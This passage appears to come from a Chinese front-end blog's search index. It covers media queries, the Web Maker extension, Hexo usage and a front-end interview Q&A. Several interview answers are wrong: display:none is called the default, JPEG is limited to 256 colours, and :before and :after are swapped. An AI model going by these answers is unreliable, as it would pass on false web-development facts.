设备输出宽度 (orientation:portrait) 竖屏 (orientation:landscape) 横屏 (-webkit-min-device-pixel-ratio: 2) 像素比 devicePixelRatio 设备像素比 window.devicePixelRatio = 物理像素 / dips  样式引入\n  \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;css/index.css\u0026quot; media=\u0026quot;print\u0026quot; /\u0026gt;  @import url(\u0026quot;css/demo.css\u0026quot;) screen; @media screen{ }  \u0026lt;link rel=”stylesheet” media=”all and (orientation:portrait)” href=”portrait.css”\u0026gt;  \u0026lt;link rel=”stylesheet” media=”all and (orientation:landscape)”href=”landscape.css”\u0026gt;  @media screen and (min-width:360px) and (max-width:500px) {}  \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot; href=\u0026quot;indexA.css\u0026quot; media=\u0026quot;screen and (min-width: 800px)\u0026quot;\u0026gt;  \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot; href=\u0026quot;indexB.css\u0026quot; media=\u0026quot;screen and (min-width: 600px) and (max-width: 800px)\u0026quot;\u0026gt;  \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot; href=\u0026quot;indexC.css\u0026quot; media=\u0026quot;screen and (max-width: 600px)\u0026quot;\u0026gt;  附录二　HTML5速查表  可以查阅支持H5+CSS3的属性 HTML5 标签含义之元素周期表 HTML5标签速查表 展示 flexbox 属性的作用\u0026ndash;推荐 Flexbox 视觉指南\u0026ndash;更好更容易地理解 Flexbox 某个属性的作用   原文md文件-仅供参考 ","permalink":"http://localhost:8000/public/post/html5+css3%E5%9F%BA%E7%A1%80%E5%9B%9E%E9%A1%BE/","tags":["HTML5","CSS3"],"title":"HTML5+CSS3整体回顾"},{"categories":["翻译"],"contents":"译自: Web Maker, an Offline, Browser-based CodePen Alternative ——by Kushagra Gaur\n 新版本3.0介绍 3.0版本开始，有了登录功能，可在线保存。同时还有了 web app，这意味着在各种现代浏览器中都可以使用 web maker 了，如：Firefox 58+, Edge。 本文，Kushagra Gaur介绍了一款他本人专为那些需要一个响应迅速且可离线工作的Web平台编译器的前端开发者而制作的浏览器扩展插件 —— Web Maker。\n 前言 如果你像我一样也是一位前端开发人员，你可能试用过一个或多个代码编译器像 CodePen、 JSBin、 JSFiddle 等（我们国内有 JSRun、RunJs）。这些都很好，能完美的满足我们的工作需求。我主要用他们来分析解决我所遇到的问题，或者用来与同事讨论的一些代码片段。但使用这些工具必须要连网，这样连网加载这些应用时就总会有固有延迟。而这也总使我感到不爽。 当外出旅行或在机场等机时，我可能也需要一个快速的途径来编译或调试代码，然而这种场景下是没有网络的，也就意味着之前提到的那些在线编译器都不能用。那该在呢么办呢？当然，你可以使用编辑器，并在浏览器中查看效果—但在这个快节奏的世界，这样操作就显得有些慢了！\n我试着去寻找一款能满足我这种需求的编译器，然而一款也没找着。另外，我发现许多人同我一样也在寻找着这样一个东西︰ https://twitter.com/armstrong/status/567403700713717763 于是决定自己来解决这个问题，然后就开发出了 Web Maker。现在我所有的 web 开发项目都会用 Web Maker，甚至在维护与再开发 Web Maker本身时也是如此！ Web Maker 是什么 ？ Web Maker 是一款 Chrome 扩展插件，将你浏览器的新选项卡 （可选） 转换成 web 编译器，你可以在其中编写 HTML、CSS 和 JavaScript，同时还可以实时预览页面效果。这款插件已经有上千(现在为4万5千多)用户了，在 Chrome Web Store上可提供下载。 下载地址：Chrome Web Store（需要翻墙。翻不了墙的也可从Github中下载后采取这种方法安装。注：步骤4对应下载包里的src文件夹）。\n特点 速度极快，可离线工作 作为一款 chrome 扩展插件， Web Maker 完全寄生在你的浏览器中。它没有涉及到网络需求（除非你正在使用一个第三方的 JavaScript 和 CSS 库）。所以它初始启动迅速。不仅如此，而且你对代码所做的的每一次中每次变动都能在预览中即时自动刷新。当然，如果仅仅只是 CSS 的变动，它甚至连刷新不需要就直接显示出来。\n你还可以选择保存或者加载你编辑好的项目以便以后再次编辑。它们会被保存在您的浏览器的本地存储中\n预处理器支持 预处理器是几乎每个开发人员的工具链中的一个组成部分。Web Maker 为你提供了HTML、CSS 以及 JavaScript三种语言中所有最常用的预处理器，包括 Markdown、Jade、SCSS、Less、JSX 以及 TypeScript。\n如果您需要在你的项目中使用外部的 JavaScript 或 CSS 库 （如 jQuery 或 Bootstrap），你只需简单点击一下”Add Library”按钮，从可用列表中，选择其中一个最受欢迎的库或输入任何库的名称，从显示的自动建议项中选择它即可。\n多种布局 除了有多个编辑器布局选项，你所保存的每个项目都记得其上次使用的布局选项，以及三个代码编辑窗口的大小。所以，基本上，每当你重新加载之前的任何项目时，你都会得到与你上次保存时完全相同的编辑器配置。\n此外，要想在实际的浏览器窗口大小下查看你的项目，只需切换到全屏布局模式即可。\n预览区域截屏功能 Chrome 扩展的 API 赋予了 Web Maker 强大的能力去做那些普通的 web 应用难以实现的功能。比如说截图捕获功能，只需单击一下 Take Screenshot 按钮即可随时得到预览区域的截图。\n可另存为 HTML 或在 CodePen 中打开 在 Web Maker 中完成了你的项目后，如果想在其他地方使用它，你并不需要将它复制粘贴到一些文件中，你只需点击 Save as HTML file 选项即可将你项目中的 HTML、 CSS 和 JavaScript 代码嵌入到一个 HTML 文件中。\n或者说你想要与世界分享你的项目︰Open on CodePen 按钮可以在 CodePen 中打开你的项目。\n源代码开源 我（Kushagra Gaur）已经将 Web Maker 在 GitHub 上开源了，我认为这样可以让我接触到更多的用户，他们可以根据他们的需求提出各种建议或标记出他们所遇到的问题，这样就可以更集中地将问题反馈上来。\n在打造这样一款 Web 平台编译器时用到了许多有趣的逻辑块。所有这些都是从开源项目中借鉴的。我个人工作中喜欢使用 Esprima 来预防无限循环。\nWeb Maker 中大量地使用了一些值得膜拜的开源项目如: CodeMirror、Esprima、Split.js、Escodegen、Inlet.js、Emmet 等。谨此向这些开源项目的作者们表示感谢！如前所述，Web Maker 在开发过程中也使用了 Web Maker。\n您可以使用 Web Maker 来做什么 除了用于通常的 web 开发工作以外，Web Maker 可以用到很多有趣的方面。让我们来看看其中的一些吧。\n学习的过程中实践，省去安装的麻烦\n如果你正在开始学习 web 开发，Web Maker 是一个你日常练习、作业等的好地方。你可以专注于编写代码而无需分心去设置编辑器或者使用预处理器时代码的生成过程\n为您的应用程序创建独立的组件\n近期，基于组件的体系结构正被广泛的用于 web 应用程序的设计中。无论你们正在使用 react、Vue 还是其他某个 JavaScript 框架，每个人都朝着使各自的应用程序成为独立组件的集合的方向设计。\n您可以在 Web Maker 中开发或者快速地试用这些独立的组件，— — 喜欢的话，也可以将它们集成到你的应用程序中。\n作为一款 Markdown 编辑器\nWeb Maker 并不仅仅限于 web 开发。如今，很多博主通常都用 Markdown 来写博客或文章，以至于他们经常要用到 Markdown 编辑器。你可以将 Web Maker 变成一款 Markdown 编辑器，并且可以非常快速地实时预览。（这篇文章是用 Web Maker 写的）。 作为在课堂里教学生的工具\n由于 Web Maker 可以离线运行，因而它又是一个很好的平台可以在课堂上供学生们探索实践巩固他们所学到的新东西。\n（可以运行代码片段）调试时帮助减少测试项 当你试图查找你应用程序中的某个 bug 时，有必要隔离可疑组件，这样你就可以在一个更小的环境中进行调试，不受应用程序中其余部分的任何干扰。 Web Maker 就是这样一个可以快速运行一段代码的很好的工具。\n存储你最喜爱的代码片段\n在网站上找到了一些有趣的代码段时，你不必记住或记下该网页地址，只需打开 Web Maker ，将代码片段粘贴到相应区域，然后给它取个名称并保存即可。这样以后需要参考或编辑时你只要再打开就可以了。\n即将到来的一些新功能 这些是 Web Maker 一些新功能（已经在新版2.4.0中实现）︰ \u0026gt; 导入/导出。很快就会有选项可以导出你的作品，而且它们也可以再次导入到 Web Maker。你还能够创建备份到云端（如 Google Drive 的服务）。\n 自定义编辑器。更多的自定义设置是也在准备中，其中包括能够设置字体大小、 主题和缩进。\n快捷键 快捷键支持。 更多详细信息请参考 GitHub issues 页面中的 roadmap（版本更新线路图）。\n","permalink":"http://localhost:8000/public/post/web_maker%E4%B8%80%E6%AC%BE%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%AF%E7%A6%BB%E7%BA%BF%E7%9A%84codepen%E6%9B%BF%E4%BB%A3%E5%93%81/","tags":["web maker","编辑器","Chrome插件","living preview"],"title":"Web Maker——一款基于浏览器的可离线的CodePen替代品"},{"categories":["学习笔记"],"contents":" Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick Start Create a new post $ hexo new \u0026quot;My New Post\u0026quot;  Create a page named tags $ hexo new page \u0026quot;tags\u0026quot;  More info: Writing\nRun server $ hexo server  More info: Server\nGenerate static files $ hexo generate  More info: Generating\nDeploy to remote sites $ hexo deploy  Front-matter Front-matter 是文件最上方以 --- 分隔的区域，用于指定个别文件的变量，举例来说：\ntitle: Hello World date: 2013/7/13 20:46:25 ---  以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。\n   参数 描述 默认值     layout 布局    title 标题    date 建立日期 文件建立日期   updated 更新日期 文件更新日期   comments 开启文章的评论功能 true   tags 标签（不适用于分页）    categories 分类（不适用于分页）    permalink 覆盖文章网址     分类和标签 只有文章支持分类和标签，您可以在 Front-matter 中设置。在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 Foo, Bar 不等于 Bar, Foo；而标签没有顺序和层次。\ncategories: - Diary tags: - PS3 - Games  兼容 Hugo 所需要的修改 由于Hugo 似乎只支持字符串与字符串数组形式的 Front-matter，如下：\ntitle: \u0026quot;title name\u0026quot; date: 2018-01-01 12:00:00 comments: true draft: false categories: \u0026quot;Diary\u0026quot; tags: [\u0026quot;PS3\u0026quot;,\u0026quot;Games\u0026quot;]  所以，为使 Hexo 生成的 .md 文件的通用性更强，需要手动改写（亲测，通过更改scaffolds 文件夹内的模板是无法实现以上格式的，所有必须手动更改）成以上格式的 Front-matter。\nMore info: Deployment\n","permalink":"http://localhost:8000/public/post/hexo-usage/","tags":["Hexo"],"title":"Hexo usages"},{"categories":["Front-End","搬运整理"],"contents":" 目录 $HTML， HTTP，web综合问题  1、前端需要注意哪些SEO 2、\u0026lt;img\u0026gt;的title和alt有什么区别 3、HTTP的几种请求方法用途 4、从浏览器地址栏输入url到显示页面的步骤 5、如何进行网站性能优化 6、HTTP状态码及其含义 7、语义化的理解 8、介绍一下你对浏览器内核的理解 9、html5有哪些新特性、移除了那些元素？ 10、HTML5的离线储存怎么使用，工作原理能不能解释一下？ 11、浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢 12、请描述一下 cookies，sessionStorage 和 localStorage 的区别 13、iframe有那些缺点？ 14、WEB标准以及W3C标准是什么? 15、xhtml和html有什么区别? 16、Doctype作用? 严格模式与混杂模式如何区分？它们有何意义? 17、行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素和块级元素有什么区别？ 18、HTML全局属性(global attribute)有哪些 19、Canvas和SVG有什么区别？ 20、HTML5 为什么只需要写 \u0026lt;!DOCTYPE HTML\u0026gt;？ 21、如何在页面上实现一个圆形的可点击区域？ 22、网页验证码是干嘛的，是为了解决什么安全问题  $CSS部分  1、css sprite是什么,有什么优缺点 2、display: none;与visibility: hidden;的区别 3、link与@import的区别 4、什么是FOUC?如何避免 5、如何创建块级格式化上下文(block formatting context),BFC有什么用 7、清除浮动的几种方式，各自的优缺点 8、为什么要初始化CSS样式? 9、css3有哪些新特性 10、display有哪些值？说明他们的作用 11、介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？ 12、CSS优先级算法如何计算？ 13、对BFC规范的理解？ 14、谈谈浮动和清除浮动 15、position 的值，relative 和 absolute 定位原点是 16、display:inline-block 什么时候不会显示间隙？(携程) 17、PNG,GIF,JPG的区别及如何选 18、行内元素float:left后是否变为块级元素？ 19、在网页中的应该使用奇数还是偶数的字体？为什么呢？ 20、::before 和 :after中双冒号和单冒号有什么区别？解释一下这2个伪元素的作用 21、如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里） 22、CSS合并方法 23、CSS不同选择器的权重(CSS层叠的规则) 24、列出你所知道可以改变页面布局的属性 25、CSS在性能优化方面的实践 26、CSS3动画（简单动画的实现，如旋转等） 27、base64的原理及优缺点  $JavaScript  1、闭包 2、说说你对作用域链的理解 3、JavaScript原型，原型链 ? 有什么特点？ 4、请解释什么是事件代理 5、Javascript如何实现继承？ 6、谈谈This对象的理解 7、事件模型 8、new操作符具体干了什么呢? 9、Ajax原理 11、模块化开发怎么做？ 12、异步加载JS的方式有哪些？ 13、那些操作会造成内存泄漏？ 14、XML和JSON的区别？ 15、谈谈你对webpack的看法 17、常见web安全及防护原理 18、用过哪些设计模式？ 19、为什么要有同源限制？ 20、offsetWidth/offsetHeight,clientWidth/clientHeight与scrollWidth/scrollHeight的区别 21、javascript有哪些方法定义对象 22、常见兼容性问题？ 22、说说你对promise的了解 23、你觉得jQuery源码有哪些写的好的地方 25、Node的应用场景 26、谈谈你对AMD、CMD的理解 27、那些操作会造成内存泄漏？ 28、web开发中会话跟踪的方法有哪些 29、介绍js的基本数据类型 30、介绍js有哪些内置对象？ 31、说几条写JavaScript的基本规范？ 32、JavaScript有几种类型的值？，你能画一下他们的内存图吗？ 33、javascript创建对象的几种方式？ 34、eval是做什么的？ 35、null，undefined 的区别？ 36、[“1”, “2”, “3”].map(parseInt) 答案是多少？ 37、javascript 代码中的”use strict”;是什么意思 ? 使用它区别是什么？ 38、JSON的了解？ 39、js延迟加载的方式有哪些？ 40、同步和异步的区别? 41、渐进增强和优雅降级 42、defer和async 43、说说严格模式的限制 44、attribute和property的区别是什么？ 45、谈谈你对ES6的理解 46、ECMAScript6 怎么写class么，为什么会出现class这种东西? 47、什么是面向对象编程及面向过程编程，它们的异同和优缺点 48、从你自己的理解来看，你是如何理解面向对象编程的，它解决了什么问题，有什么作用 49、对web标准、可用性、可访问性的理解  $编程题  1、写一个通用的事件侦听器函数 2、如何判断一个对象是否为数组 3、冒泡排序 4、快速排序 5、编写一个方法 求一个字符串的字节长度  $其他  1、谈谈你对重构的理解 2、什么样的前端代码是好的 3、对前端工程师这个职位是怎么样理解的？它的前景会怎么样？ 4、你觉得前端工程的价值体现在哪 5、平时如何管理你的项目？  人事面  面试完你还有什么问题要问的吗 你有什么爱好? 你最大的优点和缺点是什么? 你为什么会选择这个行业，职位? 你觉得你适合从事这个岗位吗? 你有什么职业规划? 你对工资有什么要求? 如何看待前端开发？ 未来三到五年的规划是怎样的？  常问  自我介绍 你的项目中技术难点是什么？遇到了什么问题？你是怎么解决的？ 你认为哪个项目做得最好？ 最近在看哪些前端方面的书？ 平时是如何学习前端开发的？ 你最有成就感的一件事 你是怎么学习前端的  $HTML， HTTP，web综合问题 1、前端需要注意哪些SEO  合理的title、description、keywords：搜索对着三项的权重逐个减小，title值强调重点即可，重要关键词出现不要超过2次，而且要靠前，不同页面title要有所不同；description把页面内容高度概括，长度合适，不可过分堆砌关键词，不同页面description有所不同；keywords列举出重要关键词即可 语义化的HTML代码，符合W3C规范：语义化代码让搜索引擎容易理解网页 重要内容HTML代码放在最前：搜索引擎抓取HTML顺序是从上到下，有的搜索引擎对抓取长度有限制，保证重要内容一定会被抓取 重要内容不要用js输出：爬虫不会执行js获取内容 少用iframe：搜索引擎不会抓取iframe中的内容 非装饰性图片必须加alt 提高网站速度：网站速度是搜索引擎排序的一个重要指标  2、\u0026lt;img\u0026gt;的title和alt有什么区别  通常当鼠标滑动到元素上的时候显示 alt是\u0026lt;img\u0026gt;的特有属性，是图片内容的等价描述，用于图片无法加载时显示、读屏器阅读图片。可提图片高可访问性，除了纯装饰图片外都必须设置有意义的值，搜索引擎会重点分析。  3、HTTP的几种请求方法用途  1、GET方法\n 发送一个请求来取得服务器上的某一资源  2、POST方法\n 向URL指定的资源提交数据或附加新的数据  3、PUT方法\n 跟POST方法很像，也是想服务器提交数据。但是，它们之间有不同。PUT指定了资源在服务器上的位置，而POST没有  4、HEAD方法\n 只请求页面的首部  5、DELETE方法\n 删除服务器上的某资源  6、OPTIONS方法\n 它用于获取当前URL所支持的方法。如果请求成功，会有一个Allow的头包含类似“GET,POST”这样的信息  7、TRACE方法\n TRACE方法被用于激发一个远程的，应用层的请求消息回路  8、CONNECT方法\n 把请求连接转换到透明的TCP/IP通道   4、从浏览器地址栏输入url到显示页面的步骤  浏览器根据请求的URL交给DNS域名解析，找到真实IP，向服务器发起请求； 服务器交给后台处理完成后返回数据，浏览器接收文件（HTML、JS、CSS、图象等）； 浏览器对加载到的资源（HTML、JS、CSS等）进行语法解析，建立相应的内部数据结构（如HTML的DOM）； 载入解析到的资源文件，渲染页面，完成。  5、如何进行网站性能优化  content方面\n 减少HTTP请求：合并文件、CSS精灵、inline Image 减少DNS查询：DNS缓存、将资源分布到恰当数量的主机名 减少DOM元素数量   Server方面\n 使用CDN 配置ETag 对组件使用Gzip压缩   Cookie方面\n 减小cookie大小  css方面\n 将样式表放到页面顶部 不使用CSS表达式 使用\u0026lt;link\u0026gt;不使用@import  Javascript方面\n 将脚本放到页面底部 将javascript和css从外部引入 压缩javascript和css 删除不需要的脚本 减少DOM访问   图片方面\n 优化图片：根据实际颜色需要选择色深、压缩 优化css精灵 不要在HTML中拉伸图片   6、HTTP状态码及其含义  1XX：信息状态码  100 Continue 继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息  2XX：成功状态码  200 OK 正常返回信息 201 Created 请求成功并且服务器创建了新的资源 202 Accepted 服务器已接受请求，但尚未处理  3XX：重定向  301 Moved Permanently 请求的网页已永久移动到新位置。 302 Found 临时性重定向。 303 See Other 临时性重定向，且总是使用 GET 请求新的 URI。 304 Not Modified 自从上次请求后，请求的网页未修改过。  4XX：客户端错误  400 Bad Request 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。 401 Unauthorized 请求未授权。 403 Forbidden 禁止访问。 404 Not Found 找不到如何与 URI 相匹配的资源。  5XX: 服务器错误  500 Internal Server Error 最常见的服务器端错误。 503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。   7、语义化的理解  用正确的标签做正确的事情！ html语义化就是让页面的内容结构化，便于对浏览器、搜索引擎解析； 在没有样式CSS情况下也以一种文档格式显示，并且是容易阅读的。 搜索引擎的爬虫依赖于标记来确定上下文和各个关键字的权重，利于 SEO。 使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解  8、介绍一下你对浏览器内核的理解？  主要分成两部分：渲染引擎(layout engineer或Rendering Engine)和JS引擎\n 渲染引擎：负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入CSS等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核\n JS引擎则：解析和执行javascript来实现网页的动态效果\n 最开始渲染引擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎\n  9、html5有哪些新特性、移除了那些元素？  HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加\n 绘画 canvas 用于媒介回放的 video 和 audio 元素 本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失 sessionStorage 的数据在浏览器关闭后自动删除 语意化更好的内容元素，比如 article、footer、header、nav、section 表单控件，calendar、date、time、email、url、search 新的技术webworker, websocket, Geolocation   移除的元素：\n 纯表现的元素：basefont，big，center，font，s，strike，tt，u 对可用性产生负面影响的元素：frame，frameset，noframes   支持HTML5新标签：\n IE8/IE7/IE6支持通过document.createElement方法产生的标签 可以利用这一特性让这些浏览器支持HTML5新标签 浏览器支持新标签后，还需要添加标签默认的样式   当然也可以直接使用成熟的框架、比如html5shim\n  10、HTML5的离线储存怎么使用，工作原理能不能解释一下？  在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件\n 原理：HTML5的离线存储是基于一个新建的.appcache文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示\n 如何使用：\n 页面头部像下面一样加入一个manifest的属性； 在cache.manifest文件的编写离线存储的资源 在离线状态时，操作window.applicationCache进行需求实现   CACHE MANIFEST #v0.11 CACHE: js/app.js css/style.css NETWORK: resourse/logo.png FALLBACK: / /offline.html  11、浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢  在线的情况下，浏览器发现html头部有manifest属性，它会请求manifest文件，如果是第一次访问app，那么浏览器就会根据manifest文件的内容下载相应的资源并且进行离线存储。如果已经访问过app并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的manifest文件与旧的manifest文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。\n 离线的情况下，浏览器就直接使用离线存储的资源。\n  12、请描述一下 cookies，sessionStorage 和 localStorage 的区别？  cookie是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密） cookie数据始终在同源的http请求中携带（即使不需要），记会在浏览器和服务器间来回传递 sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存 存储大小：\n cookie数据大小不能超过4k sessionStorage和localStorage虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大   有期时间：\n localStorage 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据 sessionStorage 数据在当前浏览器窗口关闭后自动删除 cookie 设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭   13、iframe有那些缺点？  iframe会阻塞主页面的Onload事件 搜索引擎的检索程序无法解读这种页面，不利于SEO iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载 使用iframe之前需要考虑这两个缺点。如果需要使用iframe，最好是通过javascript动态给iframe添加src属性值，这样可以绕开以上两个问题  14、WEB标准以及W3C标准是什么?  标签闭合、标签小写、不乱嵌套、使用外链css和js、结构行为表现的分离  15、xhtml和html有什么区别?  一个是功能上的差别\n 主要是XHTML可兼容各大浏览器、手机以及PDA，并且浏览器也能快速正确地编译网页   另外是书写习惯的差别\n XHTML 元素必须被正确地嵌套，闭合，区分大小写，文档必须拥有根元素   16、Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?  页面被加载的时，link会同时被加载，而@imort页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载 import只在IE5以上才能识别，而link是XHTML标签，无兼容问题 link方式的样式的权重 高于@import的权重 \u0026lt;!DOCTYPE\u0026gt; 声明位于文档中的最前面，处于 \u0026lt;html\u0026gt; 标签之前。告知浏览器的解析器， 用什么文档类型 规范来解析这个文档 严格模式的排版和 JS 运作模式是 以该浏览器支持的最高标准运行 在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。 DOCTYPE不存在或格式不正确会导致文档以混杂模式呈现  17、行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素和块级元素有什么区别？  行内元素有：a b span img input select strong 块级元素有：div ul ol li dl dt dd h1 h2 h3 h4…p 空元素：\u0026lt;br\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;img\u0026gt; \u0026lt;input\u0026gt; \u0026lt;link\u0026gt; \u0026lt;meta\u0026gt; 行内元素不可以设置宽高，不独占一行 块级元素可以设置宽高，独占一行  18、HTML全局属性(global attribute)有哪些  class:为元素设置类标识 data-*: 为元素增加自定义属性 draggable: 设置元素是否可拖拽 id: 元素id，文档内唯一 lang: 元素内容的的语言 style: 行内css样式 title: 元素相关的建议信息  19、Canvas和SVG有什么区别？  svg绘制出来的每一个图形的元素都是独立的DOM节点，能够方便的绑定事件或用来修改。canvas输出的是一整幅画布 svg输出的图形是矢量图形，后期可以修改参数来自由放大缩小，不会是真和锯齿。而canvas输出标量画布，就像一张图片一样，放大会失真或者锯齿  20、HTML5 为什么只需要写 \u0026lt;!DOCTYPE HTML\u0026gt;？  HTML5 不基于 SGML，因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为 而HTML4.01基于SGML,所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型  21、如何在页面上实现一个圆形的可点击区域？  svg border-radius 纯js实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等  22、网页验证码是干嘛的，是为了解决什么安全问题  区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水 有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试  $CSS部分 1、css sprite是什么,有什么优缺点  概念：将多个小图片拼接到一个图片中。通过background-position和元素尺寸调节需要显示的背景图案。\n 优点：\n 减少HTTP请求数，极大地提高页面加载速度 增加图片信息重复度，提高压缩比，减少图片大小 更换风格方便，只需在一张或几张图片上修改颜色或样式即可实现  缺点：\n 图片合并麻烦 维护麻烦，修改一个图片可能需要从新布局整个图片，样式   2、display: none;与visibility: hidden;的区别  联系：它们都能让元素不可见\n 区别：\n display:none;会让元素完全从渲染树中消失，渲染的时候不占据任何空间；visibility: hidden;不会让元素从渲染树消失，渲染师元素继续占据空间，只是内容不可见 display: none;是非继承属性，子孙节点消失由于元素从渲染树消失造成，通过修改子孙节点属性无法显示；visibility: hidden;是继承属性，子孙节点消失由于继承了hidden，通过设置visibility: visible;可以让子孙节点显式 修改常规流中元素的display通常会造成文档重排。修改visibility属性只会造成本元素的重绘。 读屏器不会读取display: none;元素内容；会读取visibility: hidden;元素内容   3、link与@import的区别  link是HTML方式， @import是CSS方式 link最大限度支持并行下载，@import过多嵌套导致串行下载，出现FOUC link可以通过rel=\u0026quot;alternate stylesheet\u0026quot;指定候选样式 浏览器对link支持早于@import，可以使用@import对老浏览器隐藏样式 @import必须在样式规则之前，可以在css文件中引用其他文件 总体来说：link优于@import  4、什么是FOUC?如何避免  Flash Of Unstyled Content：用户定义样式表加载之前浏览器使用默认样式显示文档，用户样式加载渲染之后再从新显示文档，造成页面闪烁。 解决方法：把样式表放到文档的head  5、如何创建块级格式化上下文(block formatting context),BFC有什么用  创建规则：\n 根元素 浮动元素（float不是none） 绝对定位元素（position取值为absolute或fixed） display取值为inline-block,table-cell, table-caption,flex, inline-flex之一的元素 overflow不是visible的元素  作用：\n 可以包含浮动元素 不被浮动元素覆盖 阻止父子元素的margin折叠   6、display,float,position的关系  如果display为none，那么position和float都不起作用，这种情况下元素不产生框 否则，如果position值为absolute或者fixed，框就是绝对定位的，float的计算值为none，display根据下面的表格进行调整。 否则，如果float不是none，框是浮动的，display根据下表进行调整 否则，如果元素是根元素，display根据下表进行调整 其他情况下display的值为指定值 总结起来：绝对定位、浮动、根元素都需要调整display  7、清除浮动的几种方式，各自的优缺点  父级div定义height 结尾处加空div标签clear:both 父级div定义伪类:after和zoom 父级div定义overflow:hidden 父级div也浮动，需要定义宽度 结尾处加br标签clear:both 比较好的是第3种方式，好多网站都这么用  8、为什么要初始化CSS样式?  因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。 当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化  9、css3有哪些新特性  新增各种css选择器 圆角 border-radius 多列布局 阴影和反射 文字特效text-shadow 线性渐变 旋转transform  CSS3新增伪类有那些？\n p:first-of-type 选择属于其父元素的首个\u0026lt;p\u0026gt;元素的每个 \u0026lt;p\u0026gt; 元素。 p:last-of-type 选择属于其父元素的最后 \u0026lt;p\u0026gt; 元素的每个 \u0026lt;p\u0026gt; 元素。 p:only-of-type 选择属于其父元素唯一的 \u0026lt;p\u0026gt;元素的每个 \u0026lt;p\u0026gt; 元素。 p:only-child 选择属于其父元素的唯一子元素的每个 \u0026lt;p\u0026gt; 元素。 p:nth-child(2) 选择属于其父元素的第二个子元素的每个 \u0026lt;p\u0026gt; 元素。 :after 在元素之前添加内容,也可以用来做清除浮动。 :before 在元素之后添加内容 :enabled\n :disabled 控制表单控件的禁用状态。 :checked 单选框或复选框被选中  10、display有哪些值？说明他们的作用  block 象块类型元素一样显示。 none 缺省值。象行内元素类型一样显示。 inline-block 象行内元素一样显示，但其内容象块类型元素一样显示。 list-item 象块类型元素一样显示，并添加样式列表标记。 table 此元素会作为块级表格来显示 inherit 规定应该从父元素继承 display 属性的值  11、介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？  有两种， IE盒子模型、W3C盒子模型； 盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)； 区 别： IE的content部分把 border 和 padding计算了进去;  12、CSS优先级算法如何计算？  优先级就近原则，同权重情况下样式定义最近者为准 载入样式以最后载入的定位为准 优先级为: !important \u0026gt; id \u0026gt; class \u0026gt; tag important 比 内联优先级高  13、对BFC规范的理解？  它决定了元素如何对其内容进行定位,以及与其他元素的关系和相互作用  14、谈谈浮动和清除浮动  浮动的框可以向左或向右移动，直到他的外边缘碰到包含框或另一个浮动框的边框为止。由于浮动框不在文档的普通流中，所以文档的普通流的块框表现得就像浮动框不存在一样。浮动的块框会漂浮在文档普通流的块框上  15、position的值， relative和absolute定位原点是  absolute：生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位 fixed：生成绝对定位的元素，相对于浏览器窗口进行定位 relative：生成相对定位的元素，相对于其正常位置进行定位 static 默认值。没有定位，元素出现在正常的流中 inherit 规定从父元素继承 position 属性的值  16、display:inline-block 什么时候不会显示间隙？(携程)  移除空格 使用margin负值 使用font-size:0 letter-spacing word-spacing  17、PNG,GIF,JPG的区别及如何选  GIF\n 8位像素，256色 无损压缩 支持简单动画 支持boolean透明 适合简单动画  JPEG\n 颜色限于256 有损压缩 